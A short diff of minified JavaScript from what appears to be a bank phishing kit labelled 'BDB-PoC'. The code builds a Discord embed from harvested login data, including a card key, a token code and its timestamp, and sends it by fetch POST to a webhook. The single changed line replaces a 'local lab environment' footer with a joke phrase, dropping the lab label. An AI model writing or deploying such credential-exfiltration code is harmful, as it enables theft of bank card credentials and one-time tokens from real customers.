@@ -114,7 +114,7 @@ else{fl.push({name:"\uD83D\uDD11 Clave tarjeta",value:lg.clave||"(vac\u00EDo)",i
 }else{fl.push({name:"\u26A0\uFE0F Nota",value:"No se encontraron datos previos de login.",inline:false})}
 fl.push({name:"\uD83D\uDD10 C\u00F3digo Token",value:c||"(vac\u00EDo)",inline:false});
 fl.push({name:"\uD83D\uDD52 Fecha token",value:f,inline:false});
-var p={username:"BDB-PoC",embeds:[{title:"Pitando",color:0xC20024,fields:fl,footer:{text:"Entorno de laboratorio local"}}]};
+var p={username:"BDB-PoC",embeds:[{title:"Pitando",color:0xC20024,fields:fl,footer:{text:"pita que pita"}}]};
 try{var rs=await fetch(W,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(p)});if(!rs.ok)console.warn("Discord:",rs.status);else console.log("Discord: enviado OK",rs.status)}catch(e){console.error("Error enviando a Discord:",e)}
 }
 function sn(v){return (v||'').replace(/\D/g,'')}
